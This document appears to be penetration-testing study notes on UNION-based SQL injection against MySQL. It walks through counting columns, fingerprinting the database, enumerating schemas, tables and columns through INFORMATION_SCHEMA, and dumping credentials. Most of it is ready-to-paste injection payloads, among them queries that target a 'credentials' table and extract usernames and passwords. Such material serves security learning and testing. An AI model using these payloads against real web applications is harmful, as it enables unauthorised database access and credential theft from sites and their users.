## Detect the Number of Columns

### Using ORDER BY

We can use `order by <column number>` to sort the results by column, we can increment the column by 1 each time until we get an error or the page doesn't show results meaning this column number doesn't exists:
```sql
' order by 1-- -
```

### Using UNION

We can use the UNION statements with selecting a few columns and getting errors until we hit the right number of columns:
```sql
cn' UNION select 1,2,3-- -
```

## Location of Injection

The page will generally print as only some of the columns and not all of them, so we should see which columns it prints so we can put our injection there.

An example if we know 2 is one of the columns printed:
```sql
cn' UNION select 1,@@version,3,4-- -
```

# Database Enumeration

## MySQL Fingerprinting

If the web server is Apache or Nginx, it's a good guess that the server is running on Linux and the DBMS is likely MySQL. If the server is IIS (Microsoft) the DBMS is likely MSSQL.

Queries to check if we are dealing with MySQL:

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|

## INFORMATION_SCHEMA Database

The INFORMATION_SCEHMA database contains metadata about other databases and tables.

Accessing a database you are not currently in:
```sql
SELECT * FROM <database>.<table>;
```

## SCHEMATA

The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) contains information about all databases, the SCHEMA_NAME column contains all the data base names.

Find the names of databases on the server:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Find which database the web application is running:
```sql
cn' UNION select 1,database(),2,3-- -
```

## Tables

The TABLES table in INFORMATION_SCHEMA contains information about all tables, the TABLE_NAME column stores table names, the TABLE_SCHEMA column points to the database each table belongs to.

Find tables within the dev database:
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

## COLUMNS

The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table from the INFORMATION_SCHEMA database contains information about all columns present in the databases, we can use the COLUMN_NAME, TABLE_NAME and TABLE_SCHEMA columns.

Find columns names in a particular table:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

## Data

Dump data from a table in a database:
```sql
cn' UNION select 1, username, password, 4 from <database>.<table>-- -
```